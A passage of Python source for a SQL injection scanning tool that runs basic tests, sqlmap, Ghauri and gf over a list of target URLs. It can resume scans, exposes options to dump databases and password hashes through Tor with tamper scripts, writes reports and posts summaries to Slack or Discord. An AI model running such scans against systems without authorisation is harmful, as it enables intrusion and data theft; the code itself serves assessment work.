            if info["available"]:
                print(f"✅ {tool_name}: {info['version']} ({info['path']})")
            else:
                print(f"❌ {tool_name}: {info['error']}")
        return

    # Create output directory
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Resume functionality
    if show_resume:
        show_resume_status(output_dir)
        return

    if clear_resume:
        cleanup_resume_state(output_dir)
        return

    # Handle resume logic
    resume_state = None
    state_file = None

    if resume:
        resume_data = load_resume_state(output_dir)
        if resume_data:
            resume_state, state_file = resume_data
            if verbose:
                print(
                    f"⏸️ [RESUME] Resuming from previous state: {resume_state.get('scan_id')}"
                )
                print(
                    f"📊 [RESUME] Processed: {len(resume_state.get('processed_urls', []))}"
                )
                print(
                    f"📊 [RESUME] Remaining: {len(resume_state.get('remaining_urls', []))}"
                )
        else:
            print("📋 [RESUME] No previous scan state found, starting new scan")
            resume = False

    # Validate URL
    if not url and not urls_file:
        print("❌ [ERROR] Either --url or --urls-file must be provided")
        return

    # Create output directory
    Path(output_dir).mkdir(parents=True, exist_ok=True)

    # Prepare URLs list
    urls = []
    completed_results = []

    if resume and resume_state:
        # Resume from previous state
        urls = resume_state.get("remaining_urls", [])
        completed_results = resume_state.get("completed_results", [])
        if verbose:
            print(
                f"⏸️ [RESUME] Resuming from previous state: {resume_state.get('scan_id')}"
            )
            print(
                f"📊 [RESUME] Processed: {len(resume_state.get('processed_urls', []))}"
            )
            print(f"📊 [RESUME] Remaining: {len(urls)}")
    elif urls_file:
        if verbose:
            print(f"📂 [LOAD] Loading URLs from {urls_file}")
        with open(urls_file, "r") as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith("#"):
                    urls.append(line)
        if verbose:
            print(f"📝 [LOAD] Loaded {len(urls)} URLs from file")
    elif url:
        urls = [url]
    else:
        print("❌ [ERROR] Either --url, --urls-file, or --resume must be provided")
        return

    if verbose:
        print(f"📊 [TOTAL] Testing {len(urls)} URLs")

    # Check tool availability
    available_tools = check_tool_availability()
    if verbose:
        print("🔧 [TOOLS] Available tools:")
        for tool_name, info in available_tools.items():
            status = "✅" if info["available"] else "❌"
            print(f"  {status} {tool_name}")

    # Determine which tools to use
    use_sqlmap = sqlmap or tool in ["sqlmap", "all"]
    use_ghauri = ghauri or tool in ["ghauri", "all"]
    use_gf = gf or tool in ["gf", "all"]
    use_basic = basic_test or tool in ["basic", "all"]

    # Prepare options
    options = {
        "output_dir": output_dir,
        "level": level,
        "risk": risk,
        "technique": technique,
        "dbms": dbms,
        "cookie": cookie,
        "data": data,
        "proxy": proxy,
        "user_agent": user_agent,
        "random_agent": random_agent,
        "headers": list(headers) if headers else None,
        "tamper": tamper,
        "threads": threads,
        "batch": batch,
        "tor": tor,
        "check_tor": check_tor,
        "dbs": dbs,
        "tables": tables,
        "columns": columns,
        "dump": dump,
        "dump_all": dump_all,
        "passwords": passwords,
        "privileges": privileges,
        "current_user": current_user,
        "current_db": current_db,
        "hostname": hostname,
        "schema": schema,
        "search": search,
    }

    # Process each URL
    all_results = completed_results.copy() if completed_results else []

    # Create state file for new scan if not resuming
    if not resume:
        state_file = create_resume_state(output_dir, urls, options)
        if verbose:
            print(f"💾 [RESUME] State file created for resume functionality")

    for i, target_url in enumerate(urls):
        if verbose:
            print(f"🔍 [SCAN] Processing URL {i+1}/{len(urls)}: {target_url}")

        result = {
            "target": target_url,
            "timestamp": datetime.now().isoformat(),
            "injection_points": [],
        }

        # Detect injection points
        if verbose:
            print(f"🔍 [DETECT] Detecting injection points...")
        result["injection_points"] = detect_injection_points(target_url)
        if verbose:
            print(
                f"🔍 [DETECT] Found {len(result['injection_points'])} potential injection points"
            )

        # Basic SQL injection testing
        if use_basic:
            if verbose:
                print(f"🧪 [BASIC] Running basic SQL injection tests...")
            result["basic_sqli_results"] = test_basic_sql_injection(target_url)
            if verbose:
                vulnerabilities = [
                    r for r in result["basic_sqli_results"] if r.get("vulnerable")
                ]
                print(
                    f"🧪 [BASIC] Found {len(vulnerabilities)} potential vulnerabilities"
                )

        # SQLMap testing
        if use_sqlmap and available_tools["sqlmap"]["available"]:
            if verbose:
                print(f"🔥 [SQLMAP] Running SQLMap...")
            result["sqlmap_results"] = run_sqlmap(target_url, options, timeout)
            if result["sqlmap_results"]["success"]:
                result["sqlmap_findings"] = parse_sqlmap_output(
                    result["sqlmap_results"]["output_file"]
                )
                if verbose:
                    print(
                        f"🔥 [SQLMAP] Found {len(result['sqlmap_findings'])} findings"
                    )
            else:
                if verbose:
                    print(
                        f"❌ [SQLMAP] Failed: {result['sqlmap_results'].get('error', 'Unknown error')}"
                    )

        # Ghauri testing
        if use_ghauri and available_tools["ghauri"]["available"]:
            if verbose:
                print(f"⚡ [GHAURI] Running Ghauri...")
            result["ghauri_results"] = run_ghauri(target_url, options, timeout)
            if result["ghauri_results"]["success"]:
                result["ghauri_findings"] = parse_ghauri_output(
                    result["ghauri_results"]["output_file"]
                )
                if verbose:
                    print(
                        f"⚡ [GHAURI] Found {len(result['ghauri_findings'])} findings"
                    )
            else:
                if verbose:
                    print(
                        f"❌ [GHAURI] Failed: {result['ghauri_results'].get('error', 'Unknown error')}"
                    )

        # GF pattern matching
        if use_gf and available_tools.get("gf", {}).get("available"):
            if verbose:
                print(f"� [GF] Running GF pattern matching...")
            urls_for_gf = [target_url] if not urls_file else urls
            result["gf_results"] = run_gf_sqli_patterns(urls_for_gf, output_dir)
            if verbose:
                total_matches = sum(
                    r.get("match_count", 0) for r in result["gf_results"].values()
                )
                print(f"🔍 [GF] Found {total_matches} pattern matches")

            # Analyze GF results
            result["gf_findings"] = analyze_gf_results(result["gf_results"])
            if verbose:
                print(
                    f"🔍 [GF] Identified {len(result['gf_findings'])} potential SQL injection points"
                )

        all_results.append(result)

        # Update resume state
        if state_file:
            update_resume_state(state_file, target_url, result, urls[i + 1 :])

    # Finalize resume state
    if state_file:
        finalize_resume_state(state_file)

    # Generate comprehensive report
    if verbose:
        print("📊 [REPORT] Generating comprehensive report...")

    comprehensive_report = generate_comprehensive_report(all_results, output_dir)

    # Save results
    output_files = []

    if json_report:
        json_file = save_results(comprehensive_report, output_dir, "json")
        output_files.append(json_file)
        if verbose:
            print(f"💾 [SAVE] JSON report saved to {json_file}")

    if yaml_report:
        yaml_file = save_results(comprehensive_report, output_dir, "yaml")
        output_files.append(yaml_file)
        if verbose:
            print(f"💾 [SAVE] YAML report saved to {yaml_file}")

    if markdown_report:
        md_file = save_results(comprehensive_report, output_dir, "markdown")
        output_files.append(md_file)
        if verbose:
            print(f"💾 [SAVE] Markdown report saved to {md_file}")

    # Always save JSON by default
    if not any([json_report, yaml_report, markdown_report]):
        json_file = save_results(comprehensive_report, output_dir, "json")
        output_files.append(json_file)
        if verbose:
            print(f"💾 [SAVE] Default JSON report saved to {json_file}")

    # Print summary
    print("\n" + "=" * 70)
    print("📊 [SUMMARY] SQL Injection Vulnerability Assessment Results")
    print("=" * 70)
    print(f"🎯 Targets tested: {comprehensive_report['summary']['total_targets']}")
    print(
        f"🔴 Vulnerable targets: {comprehensive_report['summary']['vulnerable_targets']}"
    )
    print(
        f"🚨 Critical vulnerabilities: {len(comprehensive_report['summary']['critical_vulnerabilities'])}"
    )
    print(
        f"⚠️ High risk vulnerabilities: {len(comprehensive_report['summary']['high_vulnerabilities'])}"
    )
    print(
        f"📋 Medium risk vulnerabilities: {len(comprehensive_report['summary']['medium_vulnerabilities'])}"
    )
    print(f"🔧 Tools used: {', '.join(comprehensive_report['summary']['tools_used'])}")

    # Display critical vulnerabilities
    if comprehensive_report["summary"]["critical_vulnerabilities"]:
        print("\n🚨 [CRITICAL VULNERABILITIES]")
        for vuln in comprehensive_report["summary"]["critical_vulnerabilities"][:5]:
            print(f"  • {vuln['vulnerability']} at {vuln['target']}")
            print(f"    Detected by: {vuln['tool']}")
            print(f"    {vuln['description']}")

    # Display high risk vulnerabilities
    if comprehensive_report["summary"]["high_vulnerabilities"]:
        print("\n⚠️ [HIGH RISK VULNERABILITIES]")
        for vuln in comprehensive_report["summary"]["high_vulnerabilities"][:5]:
            print(f"  • {vuln['vulnerability']} at {vuln['target']}")
            print(f"    Detected by: {vuln['tool']}")
            print(f"    {vuln['description']}")

    # Display recommendations
    if comprehensive_report["recommendations"]:
        print("\n📋 [RECOMMENDATIONS]")
        for rec in comprehensive_report["recommendations"][:5]:
            print(f"  {rec}")

    # Send notifications
    if slack_webhook or discord_webhook:
        summary_message = f"🔍 SQL Injection Vulnerability Scan Complete\n"
        summary_message += (
            f"Targets: {comprehensive_report['summary']['total_targets']}\n"
        )
        summary_message += (
            f"Vulnerable: {comprehensive_report['summary']['vulnerable_targets']}\n"
        )
        summary_message += f"Critical: {len(comprehensive_report['summary']['critical_vulnerabilities'])}\n"
        summary_message += f"High Risk: {len(comprehensive_report['summary']['high_vulnerabilities'])}\n"
        summary_message += (
            f"Tools: {', '.join(comprehensive_report['summary']['tools_used'])}\n"
        )

        if slack_webhook:
            if send_notification(slack_webhook, summary_message, "slack"):
                if verbose:
                    print("✅ [NOTIFY] Slack notification sent")
            else:
                if verbose:
                    print("❌ [NOTIFY] Failed to send Slack notification")

        if discord_webhook:
            if send_notification(discord_webhook, summary_message, "discord"):
                if verbose:
                    print("✅ [NOTIFY] Discord notification sent")
            else:
                if verbose:
                    print("❌ [NOTIFY] Failed to send Discord notification")

    print(f"\n📂 Results saved in: {output_dir}")
    print("🎉 [COMPLETE] VulnSQLiCLI scan finished successfully!")

    # Exit with appropriate code
    if comprehensive_report["summary"]["critical_vulnerabilities"]:
        exit(1)  # Critical vulnerabilities found
    elif comprehensive_report["summary"]["high_vulnerabilities"]:
        exit(2)  # High risk vulnerabilities found
    else:
        exit(0)  # No critical/high vulnerabilities found


def create_resume_state(output_dir, urls, options):
    """Create resume state file for scan continuation."""
    resume_dir = Path(output_dir) / "resume"
    resume_dir.mkdir(parents=True, exist_ok=True)

    state = {
        "scan_id": hashlib.md5(
            str(datetime.now()).encode(), usedforsecurity=False
        ).hexdigest()[:8],
        "created_at": datetime.now().isoformat(),
        "total_urls": len(urls),
        "processed_urls": [],
        "remaining_urls": urls.copy(),
        "completed_results": [],
        "options": options,
        "status": "in_progress",
    }

    state_file = resume_dir / "scan_state.json"
    with open(state_file, "w") as f:
        json.dump(state, f, indent=2)

    return state_file


def load_resume_state(output_dir):
    """Load existing resume state."""
    resume_dir = Path(output_dir) / "resume"
    state_file = resume_dir / "scan_state.json"

    if not state_file.exists():
        return None

    try:
        with open(state_file, "r") as f:
            state = json.load(f)
        return state, state_file
    except Exception as e:
        print(f"❌ [RESUME] Failed to load resume state: {e}")
        return None


def update_resume_state(state_file, processed_url, result, remaining_urls):
    """Update resume state with processed URL and result."""
    try:
        with open(state_file, "r") as f:
            state = json.load(f)

        state["processed_urls"].append(processed_url)
        state["completed_results"].append(result)
        state["remaining_urls"] = remaining_urls
        state["last_updated"] = datetime.now().isoformat()

        with open(state_file, "w") as f:
            json.dump(state, f, indent=2)
    except Exception as e:
        print(f"⚠️ [RESUME] Failed to update state: {e}")


def finalize_resume_state(state_file):
    """Mark scan as completed in resume state."""
    try:
        with open(state_file, "r") as f:
            state = json.load(f)

        state["status"] = "completed"
        state["completed_at"] = datetime.now().isoformat()

        with open(state_file, "w") as f:
            json.dump(state, f, indent=2)
    except Exception as e:
        print(f"⚠️ [RESUME] Failed to finalize state: {e}")


def cleanup_resume_state(output_dir):
    """Clean up resume state files."""
    resume_dir = Path(output_dir) / "resume"
    if resume_dir.exists():
        try:
            shutil.rmtree(resume_dir)
            print("✅ [RESUME] Resume state cleaned up")
        except Exception as e:
            print(f"⚠️ [RESUME] Failed to cleanup: {e}")


def show_resume_status(output_dir):
    """Show current resume status."""
    resume_state = load_resume_state(output_dir)
    if not resume_state:
        print("📋 [RESUME] No previous scan state found")
        return

    state, _ = resume_state
    print("📋 [RESUME] Previous Scan Status:")
    print(f"  • Scan ID: {state.get('scan_id', 'Unknown')}")
    print(f"  • Created: {state.get('created_at', 'Unknown')}")
    print(f"  • Status: {state.get('status', 'Unknown')}")
    print(f"  • Total URLs: {state.get('total_urls', 0)}")
    print(f"  • Processed: {len(state.get('processed_urls', []))}")
    print(f"  • Remaining: {len(state.get('remaining_urls', []))}")

    if state.get("last_updated"):
        print(f"  • Last Updated: {state['last_updated']}")

    if state.get("status") == "completed":
        print("✅ [RESUME] Previous scan completed successfully")
    else:
        print("⏸️ [RESUME] Previous scan was interrupted")
        print(f"  • Resume with: --resume")


if __name__ == "__main__":
    main()
